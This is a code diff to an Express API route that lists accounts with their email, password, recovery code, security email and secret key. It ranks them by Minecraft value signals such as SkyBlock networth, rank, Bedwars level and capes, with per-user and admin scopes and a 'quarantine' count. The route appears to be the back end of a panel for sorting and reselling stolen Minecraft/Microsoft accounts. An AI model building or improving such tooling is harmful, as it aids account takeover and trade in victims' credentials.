@@ -50,36 +50,144 @@ router.get('/', (req, res) => {
     else if (sort === 'username_asc') orderBy = 'ORDER BY a.username ASC';
     else if (sort === 'username_desc') orderBy = 'ORDER BY a.username DESC';
 
-    // Count total matches
-    const countSql = `
-      SELECT COUNT(DISTINCT a.uid) as total
-      FROM accounts a
-      LEFT JOIN accountsbyuser u ON a.uid = u.uid
-      ${whereClause}
-    `;
-    const countRow = get(countSql, params);
-    const total = countRow?.total || 0;
+    // Helper for parsing account stats & capes
+    const enrichAccount = (a) => {
+      let parsedStats = null;
+      if (a.stats_id && a.stats_id !== 'null') {
+        try {
+          parsedStats = JSON.parse(a.stats_id);
+        } catch (e) {}
+      }
 
-    // Fetch paginated rows
-    const querySql = `
+      const profile = parsedStats?.skyblock?.find(p => p.current === true) || parsedStats?.skyblock?.[0];
+      const networth = Number(profile?.networth) || 0;
+      const rank = (parsedStats?.rank && parsedStats.rank !== 'null') ? parsedStats.rank : 'None';
+      const sbLevel = Number(profile?.levels) || 0;
+      const bwLevel = Number(parsedStats?.bedwars?.level) || 0;
+      const nwl = !isNaN(parsedStats?.nwl) ? Math.round(Number(parsedStats.nwl)) : 0;
+
+      // Extract capes cleanly from extra_capes or capes
+      let capesList = [];
+      if (a.extra_capes && a.extra_capes !== 'null') {
+        try {
+          const raw = JSON.parse(a.extra_capes);
+          if (Array.isArray(raw)) capesList = raw;
+          else if (typeof raw === 'string') capesList = [raw];
+        } catch (e) {
+          if (a.extra_capes !== '[]') capesList = [a.extra_capes];
+        }
+      }
+      if (!capesList.length && a.capes && a.capes !== '[object Object]' && a.capes !== 'None') {
+        try {
+          const raw = JSON.parse(a.capes);
+          if (Array.isArray(raw)) capesList = raw;
+          else if (typeof raw === 'string') capesList = [raw];
+        } catch (e) {
+          capesList = a.capes.split(',').map(s => s.trim()).filter(Boolean);
+        }
+      }
+
+      // Lunar cosmetics & rank
+      let lunarRank = 'None';
+      if (a.extra_lunar) {
+        try {
+          const l = JSON.parse(a.extra_lunar);
+          if (l && l.rank && l.rank !== 'None') lunarRank = l.rank;
+        } catch (e) {}
+      }
+
+      return {
+        ...a,
+        stats: parsedStats,
+        networth,
+        rank,
+        sbLevel,
+        bwLevel,
+        nwl,
+        capesList,
+        lunarRank
+      };
+    };
+
+    // Advanced in-memory sort or SQL sort
+    const isCustomSort = ['networth', 'rank', 'bedwars_level', 'skyblocklvl', 'capes'].includes(sort);
+
+    let accounts = [];
+    let total = 0;
+
+    const baseSelectSql = `
       SELECT DISTINCT 
         a.id, a.uid, a.user_id, a.username, a.ownsmc, a.capes, 
         a.email, a.recoverycode, a.secemail, a.secretkey, a.password, 
         a.stats_id, a.time,
+        e.capes as extra_capes, e.lunar as extra_lunar, e.msbalance,
         (SELECT COUNT(*) FROM quarantine q WHERE q.uuid = a.uid OR q.name = a.username) as is_quarantined
       FROM accounts a
       LEFT JOIN accountsbyuser u ON a.uid = u.uid
+      LEFT JOIN extrainformation e ON a.uid = e.uid
       ${whereClause}
-      ${orderBy}
-      LIMIT ? OFFSET ?
     `;
 
-    const accounts = query(querySql, [...params, limitNum, offset]);
+    if (isCustomSort) {
+      // Fetch all matches for sorting
+      const rawAccounts = query(baseSelectSql, params).map(enrichAccount);
+      total = rawAccounts.length;
+
+      if (sort === 'networth') {
+        rawAccounts.sort((x, y) => y.networth - x.networth);
+      } else if (sort === 'rank') {
+        const rankOrder = ['owner', 'admin', 'mod', 'helper', 'youtube', 'mvp++', 'mvp+', 'mvp', 'vip+', 'vip', 'none'];
+        rawAccounts.sort((x, y) => {
+          const rx = rankOrder.indexOf(x.rank.toLowerCase());
+          const ry = rankOrder.indexOf(y.rank.toLowerCase());
+          return (rx === -1 ? 99 : rx) - (ry === -1 ? 99 : ry);
+        });
+      } else if (sort === 'bedwars_level') {
+        rawAccounts.sort((x, y) => y.bwLevel - x.bwLevel);
+      } else if (sort === 'skyblocklvl') {
+        rawAccounts.sort((x, y) => y.sbLevel - x.sbLevel);
+      } else if (sort === 'capes') {
+        rawAccounts.sort((x, y) => y.capesList.length - x.capesList.length);
+      }
+
+      accounts = rawAccounts.slice(offset, offset + limitNum);
+    } else {
+      // Count total matches
+      const countSql = `
+        SELECT COUNT(DISTINCT a.uid) as total
+        FROM accounts a
+        LEFT JOIN accountsbyuser u ON a.uid = u.uid
+        ${whereClause}
+      `;
+      const countRow = get(countSql, params);
+      total = countRow?.total || 0;
+
+      const pagedSql = `${baseSelectSql} ${orderBy} LIMIT ? OFFSET ?`;
+      accounts = query(pagedSql, [...params, limitNum, offset]).map(enrichAccount);
+    }
+
+    // Compute overview metrics
+    const metricsParams = (!isAdmin || scope !== 'all') ? [userId, userId] : [];
+    const metricsWhere = (!isAdmin || scope !== 'all') ? 'WHERE (a.user_id = ? OR u.user_id = ?)' : '';
+    const metricsRow = get(`
+      SELECT 
+        COUNT(DISTINCT a.uid) as totalCount,
+        SUM(CASE WHEN a.ownsmc IS NOT NULL AND a.ownsmc != 'No MC' AND a.ownsmc NOT LIKE '%Failed%' THEN 1 ELSE 0 END) as mcCount,
+        SUM(CASE WHEN (SELECT COUNT(*) FROM quarantine q WHERE q.uuid = a.uid OR q.name = a.username) > 0 THEN 1 ELSE 0 END) as quarantineCount
+      FROM accounts a
+      LEFT JOIN accountsbyuser u ON a.uid = u.uid
+      ${metricsWhere}
+    `, metricsParams);
 
     res.json({
       success: true,
       data: {
         accounts,
+        metrics: {
+          totalCount: metricsRow?.totalCount || 0,
+          mcCount: metricsRow?.mcCount || 0,
+          quarantineCount: metricsRow?.quarantineCount || 0
+        },
         pagination: {
           page: pageNum,
           limit: limitNum,
